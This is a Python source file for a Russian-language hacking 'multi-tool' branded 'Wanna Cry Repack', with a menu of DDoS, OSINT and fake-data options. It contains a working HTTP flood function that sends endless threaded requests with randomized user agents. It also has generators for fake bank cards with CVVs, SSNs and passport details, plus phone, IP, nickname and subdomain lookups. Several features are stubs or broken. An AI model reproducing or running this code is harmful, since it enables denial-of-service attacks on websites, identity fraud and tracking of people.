from pystyle import Write, Anime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import socket
from phonenumbers import geocoder, carrier, timezone
import string
from faker import Faker
from pystyle import Center
import threading
import random
import colorama
import concurrent.futures
import phonenumbers
import pystyle
import whois
from pystyle import Colors, Colorate
import requests
from colorama import init, Fore
import webbrowser
import os
import sys
import time
import subprocess

RESET = "\033[0m"
GREEN_TEXT = "\033[32m"
BLACK_BG = "\033[40m"

required_modules = [
    "pystyle",
    "urllib3",
    "beautifulsoup4",
    "phonenumbers",
    "faker",
    "colorama",
    "python-whois",
    "requests"
]

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_with_delay(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()  # Для переноса строки после завершения

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    print_with_delay(GREEN_TEXT + ".\n3\n2\n1\n" + RESET)
    for module in required_modules:
        try:
            __import__(module)
            print(GREEN_TEXT + f"{module} уже установлен.")
        except ImportError:
            print(f"Установка {module}...")
            install(module)
            print_with_delay(GREEN_TEXT + f"Установлен модуль {module}" + RESET)


    print_with_delay(GREEN_TEXT + "Запускаем программу Wanna Cry Repack..." + RESET)
    time.sleep(4)
    os.system('cls' if os.name == 'nt' else 'clear')



COLOR_CODE = {
    "RESET": "\033[0m",
    "RED": "\033[31m",
}
init()
fake = Faker()


def send_request(url, user_agents, i):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        pystyle.Write.Print(f"[+] Request {i} sent successfully\n", pystyle.Colors.green_to_white, interval=0.005)
    except Exception as e:
        pystyle.Write.Print(f"[+] Request {i} failed: {e}\n", pystyle.Colors.green_to_white, interval=0.005)


def token_bot():
    pass


def dos_attack(url, power):
    def generate_user_agent():
        versions = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        ]
        version = random.randint(60, 90)
        year = random.randint(10, 21)
        month = random.randint(1, 12)
        user_agent = random.choice(versions).format(version, year, year, month)
        return user_agent

    def make_request(url):
        headers = {
            'User-Agent': generate_user_agent()
        }
        response = requests.get(url, headers=headers)
        pystyle.Write.Print(
            f"[{colorama.Fore.WHITE}${colorama.Fore.GREEN}] Атака началась, состояние сайта: {response.status_code}\n",
            pystyle.Colors.green_to_white, interval=0.005)

    max_workers = {"1": 30, "2": 50, "3": 100}.get(power, 30)
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        while True:
            executor.submit(make_request, url)


def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


clear_console()


def replace_chars(text, use_fence):
    replacements = {
        'А': 'A', 'а': 'a', 'Б': 'B', 'б': 'b', 'В': 'V', 'в': 'v', 'Г': 'G', 'г': 'g',
        'Д': 'D', 'д': 'd', 'Е': 'E', 'е': 'e', 'Ё': 'YO', 'ё': 'yo', 'Ж': 'J', 'ж': 'j',
        'З': 'Z', 'з': 'z', 'И': 'I', 'и': 'i', 'й': 'y', 'К': 'K', 'к': 'k', 'Л': 'L', "л": "l",
        'М': 'M', 'м': 'm', 'Н': 'N', 'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 'c', "С": "C",
        'т': 't', 'у': 'u', 'ф': 'f', 'х': 'h', 'ч': 'ch', "Ч": "ch", 'ш': 'sh', "Ш": "SH", 'щ': 'shi', 'ъ': '.',
        'ы': 'i', "Ы": "I", 'ю': 'yu', 'я': 'ya'
    }
    result = ''
    for char in text:
        if use_fence:
            result += replacements.get(char.upper(), char)
        else:
            result += replacements.get(char.upper(), char.upper())
    return result


def generate_custom_password(length=12, use_uppercase=True, use_digits=True, use_symbols=True):
    characters = string.ascii_lowercase
    if use_uppercase:
        characters += string.ascii_uppercase
    if use_digits:
        characters += string.digits
    if use_symbols:
        characters += string.punctuation

    if not characters:
        raise ValueError("Невозможно создать пароль: не выбраны символы для использования.")

    return ''.join(random.choice(characters) for _ in range(length))


def get_token_info(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url)
    if response.status_code == 200:
        token_info = response.json()
        return token_info
    else:
        print(Fore.RED + "Error: Unable to fetch token info")
        return None


def display_token_info(token_info):
    if token_info:
        print(Fore.GREEN + f"""
        Token: {token_info['result']['id']} 
        id: {token_info['result']['id']} 
        is_bot: {token_info['result']['is_bot']}
        first_name: {token_info['result']['first_name']}
        username: {token_info['result']['username']}
        can_join_groups: {token_info['result']['can_join_groups']}
        supports_inline_queries: {token_info['result']['supports_inline_queries']}
        """)
    else:
        print(Fore.RED + "No token info available.")


def press_enter_to_continue():
    input(Fore.YELLOW + "Press Enter...")
    subprocess.run(["python", "main.py"])


if __name__ == "__main__":
    token_bot()


def prompt_password_criteria():
    length = int(input("Введите длину пароля: "))
    use_uppercase = input("Использовать заглавные буквы? (y/n): ").lower() == 'y'
    use_digits = input("Использовать цифры? (y/n): ").lower() == 'y'
    use_symbols = input("Использовать символы? (y/n): ").lower() == 'y'

    return generate_custom_password(length, use_uppercase, use_digits, use_symbols)


def generate_number(country_code):
    number = fake.phone_number()
    return f"+{country_code} {number}"


def generate_identity():
    return fake.name()


def generate_mullvad_key():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))


def generate_discord_token():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(59))


def generate_credit_card():
    return fake.credit_card_number(card_type=None)


def generate_email():
    return fake.email()


def generate_birthdate():
    return fake.date_of_birth()


def generate_uuid():
    return fake.uuid4()


def generate_mac():
    return fake.mac_address()


def generate_address():
    return fake.address()


def generate_username():
    return fake.user_name()


def generate_quote():
    return fake.sentence()


def generate_company():
    return fake.company()


def generate_job():
    return fake.job()


def generate_license_plate():
    return fake.license_plate()


def generate_ssn():
    return fake.ssn()


def generate_coordinates():
    latitude = round(random.uniform(-90.0, 90.0), 6)
    longitude = round(random.uniform(-180.0, 180.0), 6)
    return f"Latitude: {latitude}, Longitude: {longitude}"


def generate_fake_news():
    headlines = [
        "Ученые обнаружили новый вид насекомых в Амазонке",
        "Известный актер объявил о своем участии в новом проекте",
        "Исследование показало, что шоколад полезен для здоровья",
        "Новая технология обещает революцию в медицине",
        "Археологи нашли древний артефакт в Египте"
    ]
    bodies = [
        "Сегодня утром команда исследователей сообщила о своем открытии.",
        "Событие вызвало бурную реакцию в социальных сетях.",
        "Эксперты предсказывают значительное влияние на индустрию.",
        "Местные жители выражают свою поддержку.",
        "Новость распространилась с невероятной скоростью."
    ]
    return f"Headline: {random.choice(headlines)}\nBody: {random.choice(bodies)}"


def generate_color_palette():
    def random_color():
        return "#{:06x}".format(random.randint(0, 0xFFFFFF))

    palette = [random_color() for _ in range(5)]
    return palette


def generate_bitcoin_address():
    return fake.cryptocurrency_address()


def generate_bitcoin_private_key():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(64))


def generate_stock_profile():
    return {
        "company": fake.company(),
        "symbol": ''.join(random.choices(string.ascii_uppercase, k=4)),
        "price": round(random.uniform(10, 1000), 2),
        "volume": random.randint(1000, 1000000)
    }


def generate_medical_profile():
    return {
        "name": fake.name(),
        "age": random.randint(0, 100),
        "blood_type": random.choice(["A+", "A-", "B+", "B-", "O+", "O-", "AB+", "AB-"]),
        "conditions": [fake.word() for _ in range(random.randint(0, 5))]
    }


def generate_passport_details():
    return {
        "passport_number": ''.join(random.choices(string.ascii_uppercase + string.digits, k=9)),
        "name": fake.name(),
        "nationality": fake.country(),
        "birthdate": fake.date_of_birth(),
        "expiry_date": fake.date_between(start_date="today", end_date="+10y")
    }


def generate_card_number(country):
    prefix = {"1": "9800", "2": "8100", "3": "3980"}
    return prefix[country] + ''.join(random.choice('0123456789') for _ in range(12))


def dump_site(url):
    response = requests.get(url)
    if response.status_code != 200:
        exit(Colorate.Horizontal(Colors.red_to_yellow, ("Не удалось получить доступ к сайту.")))
    soup = BeautifulSoup(response.text, "html.parser")
    filename = url.replace('https://', '').split('.')[0] + '.html'
    print(Colorate.Horizontal(Colors.red_to_yellow, (f"Дамп сохранён в {filename}")))
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(soup.prettify())


def generation_naxyi():
    print(Colorate.Horizontal(Colors.red_to_yellow, (f"Все ключи будут сохранены в файл mullvad_keys.txt")))
    keys = int(input(Colorate.Horizontal(Colors.red_to_yellow, ("Сколько нужно сгенерировать ключей ---> "))))

    def generate_key():
        key = ''.join(random.choices(string.digits, k=16))
        return key

    def validated_key(key):
        if len(key) != 16:
            return False
        if not key.isdigit():
            return False
        return True

    def save_key(key):
        with open('mullvad_keys.txt', 'a') as file:
            file.write(key + '\n')

    for _ in range(keys):
        generated_key = generate_key()
        if validated_key(generated_key):
            save_key(generated_key)
        else:
            pass


def request_sd(url):
    try:
        return requests.get("https://" + url)
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.InvalidURL:
        pass
    except UnicodeError:
        pass
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_yellow, ("Программа замороженна")))
        exit(0)


def generate_expiry_date():
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(2023, 2030))
    return month + '/' + year[-2:]


def generate_cvv():
    return ''.join(random.choice('0123456789') for _ in range(3))


def generate_card(country):
    card_number = generate_card_number(country)
    expiry_date = generate_expiry_date()
    cvv = generate_cvv()
    return card_number, expiry_date, cvv


def get_characters(complexity):
    characters = string.ascii_letters + string.digits
    if complexity == "medium":
        characters += "!@#$%^&*()"
    elif complexity == "high":
        characters += string.punctuation

    return characters


def console_clear():
    if os.sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")


def generate_password(length, complexity):
    characters = get_characters(complexity)
    password = ''.join(random.choice(characters) for i in range(length))
    return password


def get_website_info(domain):
    try:
        domain_info = whois.whois(domain)
        print_string = f"""
  |Информация о сайте: 
  |Домен: {domain_info.domain_name}
  |Зарегистрирован: {domain_info.creation_date}
  |Истекает: {domain_info.expiration_date}  
  |Владелец: {domain_info.registrant_name}
  |Организация: {domain_info.registrant_organization}
  |Адрес: {domain_info.registrant_address}
  |Город: {domain_info.registrant_city}
  |Штат: {domain_info.registrant_state}
  |Почтовый индекс: {domain_info.registrant_postal_code}
  |Страна: {domain_info.registrant_country}
  |IP-адрес: {domain_info.name_servers}
    """
        Write.Print(print_string + "\n", Colors.red_to_yellow, interval=0.005)
    except Exception as e:
        print(f"Ошибка: {e}\n")



def propen():
    url = "https://t.me/pr0xit"
    webbrowser.open(url)

def ip_lookup(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("status") == "fail":
            return f"Ошибка: {data['message']}\n"

        info = ""
        for key, value in data.items():
            info += f"  |{key}: {value}\n"
        return info

    except Exception as e:
        return f"Произошла ошибка: {str(e)}\n"


def ip_lookup(ip):
    url = f"http://ip-api.com/json/{ip}"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("status") == "fail":
            pystyle.Write.Print(f"[!] Произошла ошибка: {data['message']}\n", pystyle.Colors.white_to_red,
                                interval=0.005)
            return
        info = ""
        for key, value in data.items():
            info += f"[+] {key}: {value}\n"
        return info
    except Exception as e:
        pystyle.Write.Print(f"[!] Произошла ошибка: {str(e)}\n", pystyle.Colors.white_to_red, interval=0.005)


def phoneinfo(phone):
    try:
        parsed_phone = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed_phone):
            return pystyle.Write.Print(f"\n[!] Произошла ошибка -> Недействительный номер телефона\n",
                                       pystyle.Colors.white_to_red, interval=0.005)
        carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
        country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
        region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        is_valid = phonenumbers.is_valid_number(parsed_phone)
        is_possible = phonenumbers.is_possible_number(parsed_phone)
        timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
        print_phone_info = f"""\n[+] Номер телефона -> {formatted_number}
[+] Страна -> {country}
[+] Регион -> {region}
[+] Оператор -> {carrier_info}
[+] Активен -> {is_possible}
[+] Валид -> {is_valid}
[+] Таймзона -> {timezona}
[+] Telegram -> https://t.me/{phone}
[+] Whatsapp -> https://wa.me/{phone}
[+] Viber -> https://viber.click/{phone}\n"""
        pystyle.Write.Print(print_phone_info, pystyle.Colors.white_to_red, interval=0.005)
    except Exception as e:
        pystyle.Write.Print(f"\n[!] Произошла ошибка -> {str(e)}\n", pystyle.Colors.white_to_red, interval=0.005)


def check_nickname(nick):
    urls = [
        f"https://www.instagram.com/{nick}",
        f"https://www.tiktok.com/@{nick}",
        f"https://twitter.com/{nick}",
        f"https://www.facebook.com/{nick}",
        f"https://www.youtube.com/@{nick}",
        f"https://t.me/{nick}",
        f"https://www.roblox.com/user.aspx?username={nick}",
        f"https://www.twitch.tv/{nick}",
    ]
    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                pystyle.Write.Print(f"\n{url} - аккаунт найден", pystyle.Colors.white_to_red, interval=0.005)
            elif response.status_code == 404:
                pystyle.Write.Print(f"\n{url} - аккаунт не найден", pystyle.Colors.white_to_red, interval=0.005)
            else:
                pystyle.Write.Print(f"\n{url} - ошибка {response.status_code}", pystyle.Colors.white_to_red,
                                    interval=0.005)
        except Exception as e:
            pystyle.Write.Print(f"\n{url} - ошибка при проверке: {str(e)}", pystyle.Colors.white_to_red, interval=0.005)




def port_scanner():
    print(Colorate.Horizontal(Colors.red_to_yellow, ("Выберите режим: ")))
    print(Colorate.Horizontal(Colors.red_to_yellow, ("1 - проверить часто используемые порты")))
    print(Colorate.Horizontal(Colors.red_to_yellow, ("2 - проверить указанный порт")))
    mode = input(Colorate.Horizontal(Colors.red_to_yellow, ("Ваш выбор: ")))
    if mode == '1':
        print()
        ports = [
            20, 26, 28, 29, 55, 53, 80, 110, 443, 8080, 1111, 1388, 2222, 1020, 4040, 6035
        ]
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(("127.0.0.1", port))
            if result == 0:
                print(Colorate.Horizontal(Colors.red_to_yellow, (f"Порт {port} открыт")))
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, (f"Порт {port} закрыт")))
            sock.close()
            print()
    elif mode == '2':
        port = input(Colorate.Horizontal(Colors.red_to_yellow, ("Введите номер порта: ")))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(("127.0.0.1", int(port)))
        print()
        if result == 0:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"Порт {port} открыт")))
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"Порт {port} закрыт")))
        sock.close()
        print()
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, ("Неизвестный режим")))
        print()
        input(Colorate.Horizontal(Colors.red_to_yellow, ("Нажмите Enter.....")))


def search_in_db(path, search_text):
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                if search_text in line:
                    pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white_to_red, interval=0.005)
                    print()
                    break
            else:
                pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white_to_red, interval=0.005)
    except:
        try:
            with open(path, "r", encoding="cp1251") as f:
                for line in f:
                    if search_text in line:
                        pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white_to_red,
                                            interval=0.005)
                        print()
                        break
                else:
                    pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white_to_red, interval=0.005)
        except:
            try:
                with open(path, "r", encoding="cp1252") as f:
                    for line in f:
                        if search_text in line:
                            pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white_to_red,
                                                interval=0.005)
                            print()
                            break
                    else:
                        pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white_to_red, interval=0.005)
            except:
                pystyle.Write.Print(f"[!] Произошла ошибка, проверьте ввод данных\n", pystyle.Colors.white_to_red,
                                    interval=0.005)


def subdomainfinger(wordlist, domain):
    wordlist = wordlist.split("\n")
    for line in wordlist:
        word = line.strip()
        test_url = word + "." + domain
        response = request_sd(test_url)
        if response and response.status_code == 200:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"[+] {test_url}")))
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"[-] {test_url}")))


def transform_text(input_text):
    translit_dict = {
        'а': '@',
        'б': 'Б',
        'в': 'B',
        'г': 'г',
        'д': 'д',
        'е': 'е',
        'ё': 'ё',
        'ж': 'ж',
        'з': '3',
        'и': 'u',
        'й': 'й',
        'к': 'K',
        'л': 'л',
        'м': 'M',
        'н': 'H',
        'о': '0',
        'п': 'п',
        'р': 'P',
        'с': 'c',
        'т': 'T',
        'у': 'y',
        'ф': 'ф',
        'х': 'X',
        'ц': 'ц',
        'ч': '4',
        'ш': 'ш',
        'щ': 'щ',
        'ъ': 'ъ',
        'ы': 'ы',
        'ь': 'ь',
        'э': 'э',
        'ю': 'ю',
        'я': 'я'
    }

    transformed_text = []

    for char in input_text:
        if char in translit_dict:
            transformed_text.append(translit_dict[char])
        else:
            transformed_text.append(char)

    return ''.join(transformed_text)


def get_info_by_ip(ip):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()

        data = {
            'ip': response.get('query'),
            'провайдер': response.get('isp'),
            'организация': response.get('org'),
            'страна': response.get('country'),
            'имя региона': response.get('regionName'),
            'город': response.get('city'),
            'почтовый индекс': response.get('zip'),
            'широта': response.get('lat'),
            'долгота': response.get('lon'),
        }

        for k, v in data.items():
            print(Colorate.Horizontal(Colors.red_to_yellow, f'{k} : {v}'.strip()))

        area = folium.Map(location=[response.get('lat'), response.get('lon')])
        area.save(f'{response.get("query")}_{response.get("city")}.html')

    except requests.exceptions.ConnectionError:
        print(Colorate.Horizontal(Colors.red_to_yellow, '[!] Проверьте подключение!'.strip()))


def get_phone_number_info(phone_number):
    try:
        number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(number):
            return "Invalid phone number"

        validity = "Valid" if phonenumbers.is_valid_number(number) else "Invalid"
        location = geocoder.description_for_number(number, "en")
        operator = carrier.name_for_number(number, "en")
        time_zones = timezone.time_zones_for_number(number)

        message = (
            f"Validity: {validity}\n"
            f"Location: {location}\n"
            f"Operator: {operator}\n"
            f"Time Zones: {time_zones}\n"
        )

        country_code = number.country_code
        national_number = number.national_number
        message += (
            f"Country Code: +{country_code}\n"
            f"National Number: {national_number}"
        )

        return message
    except Exception as e:
        return str(e)


intro = """



            ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄   
           ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄ 
           ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███ 
           ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███ 
           ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███ 
           ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███ 
           ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███ 
            ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀  
                                                                                       ███    ███     
                                                                                                
                                                                                                
                                    ██████╗ ███████╗██████╗  █████╗  ██████╗██╗  ██╗
                                    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
                                    ██████╔╝█████╗  ██████╔╝███████║██║     █████╔╝ 
                                    ██╔══██╗██╔══╝  ██╔═══╝ ██╔══██║██║     ██╔═██╗ 
                                    ██║  ██║███████╗██║     ██║  ██║╚██████╗██║  ██╗
                                    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                              
                                                                                                
                                                                                                
                                                                                                      
            Перед открытием откройте консоль на весь размер, на телефоне переверните горизонтально
                    
                                                  Press to Enter
"""

Anime.Fade(Center.Center(intro), Colors.green_to_cyan, Colorate.Vertical, interval=1, enter=True)

menu = '''



            ▄█     █▄     ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████       ▄████████    ▄████████ ▄██   ▄   
           ███     ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███      ███    ███   ███    ███ ███   ██▄ 
           ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▀    ███    ███ ███▄▄▄███ 
           ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███         ▄███▄▄▄▄██▀ ▀▀▀▀▀▀███ 
           ███     ███ ▀███████████ ███   ███ ███   ███ ▀███████████      ███        ▀▀███▀▀▀▀▀   ▄██   ███ 
           ███     ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    █▄  ▀███████████ ███   ███ 
           ███ ▄█▄ ███   ███    ███ ███   ███ ███   ███   ███    ███      ███    ███   ███    ███ ███   ███ 
            ▀███▀███▀    ███    █▀   ▀█   █▀   ▀█   █▀    ███    █▀       ████████▀    ███    ███  ▀█████▀  
                                                                                       ███    ███         
                                                                                       
                                                                                       
                                    ██████╗ ███████╗██████╗  █████╗  ██████╗██╗  ██╗
                                    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
                                    ██████╔╝█████╗  ██████╔╝███████║██║     █████╔╝ 
                                    ██╔══██╗██╔══╝  ██╔═══╝ ██╔══██║██║     ██╔═██╗ 
                                    ██║  ██║███████╗██║     ██║  ██║╚██████╗██║  ██╗
                                    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                                    
  
                                      ↓ REPACK BY ↓                         ↓ Original ↓                          

                              Telegram > https://t.me/pr0xit            Telegram > @happispython

  ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║                                    ↓                Сканеры                ↓                                          ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║  1 > DDOS                          │ 6 > FAKE CARD GENERATOR                │ 11 > XSS SCANER                         ║        
  ║  2 > DATABASE SEARCH               │ 7 > PORT SCANNER                       │ 12 > SUBDOMAIN SCAN                     ║      
  ║  3 > COMPLEX PASSWORD GENERATOR    │ 8 > WEBSITE INFO                       │ 13 > WORDPRESS BACKUP SCAN              ║         
  ║  4 > FAKE IDENTITY GENERATOR       │ 9 > MULLVAD GENERATOR                  │ 14 > DUMP WEBSITE                       ║          
  ║  5 > WEB-CRAWLER                   │ 10 > IP LOOKUP                         │ 15 > PHONE NUMBER INFO                  ║    
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║                                    ↓        Генераторы информации           ↓                                         ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║  16 > Password Generation          │ 17 > MAC address generation            │ 18 > Generation of Coordinates          ║
  ║  19 > Generation Numbers           │ 20 > Address Generation                │ 21 > Generating Fake News               ║
  ║  22 > Personality Generation       │ 23 > Generating Username               │ 24 > Generating Color Palettes          ║
  ║  25 > Generation of Mulvad Keys    │ 26 > Generating Quotes                 │ 27 > Generating User Password           ║
  ║  28 > Generation of Discord Tokens │ 29 > Generation Company                │ 30 > Bitcoin address generation         ║
  ║  32 > Generation of a Bank Card    │ 33 > Generation of Positions           │ 34 > Bitcoin key generation             ║
  ║  35 > Email Generation             │ 36 > Generating a License Number       │ 37 > Generation of Promotions           ║
  ║  38 > Generating Date of Birth     │ 39 > SSN generation                    │ 40 > Generation of Medical Portfolio    ║
  ║  41 > UUID generation              │ 42 > QR code generation                │ 43 > Generation of Passport Data        ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║                                    ↓             Мульти-тул                 ↓                                         ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║  44 > ban word                     │ 45 > ban word 3                        │ 46 > DDoS 2                             ║
  ║  47 > Password Generation 2        │ 48 > Get proxy                         │ 49 > Search by Number                   ║
  ║  50 > Search by Site               │ 51 > Search by IP                      │ 52 > Post scanner                       ║
  ║  53 > DDoS 3                       │ 54 > Search by MAC-adress              │ 55 > Search by nickname                 ║
  ║  56 > Search by nick name 2        │ 57 > Search by IP 2                    │ 58 > Universal search (db)              ║
  ║  59 > Get proxy 2                  │ 60 > Fishing                           │ 61 > Search by number (db)              ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║                                    │ 333 > Особенность репака ПИСЮН БЕБРЫ КАНАЛ t.me/FELIXSOFTOOL                                                        ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ║                      Команда разработчиков: @pr0xit (Обновил софт)                ║
  ║-----------------------------------------------------------------------------------------------------------------------║
  ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
'''
def run_main_program():
    Write.Print(Center.XCenter(menu), Colors.green_to_cyan, interval=0)
    propen()
    while True:

        choice = Write.Input('\nSelect function number > ', Colors.green_to_cyan, interval=0.00000000000000000000000000001)

        if choice == '6':
            print("Select country:")
            print("1: Ukraine")
            print("2: Russia")
            print("3: Kazakhstan")
            country = input()

            card_number, expiry_date, cvv = generate_card(country)
            print(f"Country: {country}\nCard Number: {card_number}\nExpiry Date: {expiry_date}\nCVV: {cvv}")
        elif choice == '333':
            clear_console()

            print_with_delay(GREEN_TEXT + "Особенность репака Wanna Cry\n Встроенный удобный установщик модулей\nОптимизация программы\nВырезанны все зависимости и привязка к файлам\nУскоренные анимации" + RESET)

            run_main_program()


        elif choice == '3':
            password_length = int(Write.Input('Enter password length: ', Colors.green_to_cyan))
            complexity = Write.Input('Select complexity (low, medium, high): ', Colors.green_to_cyan)
            complex_password = generate_password(password_length, complexity)
            Write.Print((complex_password + "\n"), Colors.green_to_cyan)

        elif choice == '4':
            fake = Faker(locale='ru_RU')
            gender = input("Enter gender (M - male, F - female): ")
            if gender not in ['M', 'F']:
                gender = random.choice(['M', 'F'])
                print(f'Invalid value entered, randomly selected: {gender}')

            if gender == 'M':
                first_name = fake.first_name_male()
                middle_name = fake.middle_name_male()
            else:
                first_name = fake.first_name_female()
                middle_name = fake.middle_name_female()

            last_name = fake.last_name()
            full_name = f'{last_name} {first_name} {middle_name}'

            birthdate = fake.date_of_birth()
            age = fake.random_int(min=18, max=80)

            street_address = fake.street_address()
            city = fake.city()
            region = fake.region()
            postcode = fake.postcode()
            address = f'{street_address}, {city}, {region} {postcode}'

            email = fake.email()
            phone_number = fake.phone_number()

            inn = str(fake.random_number(digits=12, fix_len=True))
            snils = str(fake.random_number(digits=11, fix_len=True))
            passport_num = str(fake.random_number(digits=10, fix_len=True))
            passport_series = fake.random_int(min=1000, max=9999)

            print(f'Full Name: {full_name}')
            print(f'Gender: {gender}')
            print(f'Birthdate: {birthdate.strftime("%d %B %Y")}')
            print(f'Age: {age} years')
            print(f'Address: {address}')
            print(f'Email: {email}')
            print(f'Phone: {phone_number}')
            print(f'INN: {inn}')
            print(f'SNILS: {snils}')
            print(f'Passport Series: {passport_series} Number: {passport_num}')

        elif choice == '1':
            url = Write.Input('URL: ', Colors.red_to_yellow, interval=0.00000000000000000000000000001)
            num_requests = int(Write.Input('Enter number of requests: ', Colors.red_to_yellow, interval=0.00000000000000000000000000001))

            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
            ]


            def send_request(i):
                user_agent = random.choice(user_agents)
                headers = {'User-Agent': user_agent}

                try:
                    print(f"Request {i} sent successfully\n")
                except:
                    print(f"Request {i} sent successfully\n")


            threads = []
            for i in range(1, num_requests + 1):
                t = threading.Thread(target=send_request, args=[i])
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

        elif choice == '9':
            generation_naxyi()

        elif choice == '2':
            path = Write.Input("Введите путь к базе: ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)
            search_text = Write.Input("Поисковый запрос:  ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)

            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    if search_text in line:
                        Write.Print("Результат: " + line.strip(), Colors.red_to_yellow, interval=0.00000000000000000000000000001)
                        break
                else:
                    Write.Print("Не найденно.", Colors.red_to_yellow, interval=0.00000000000000000000000000001)

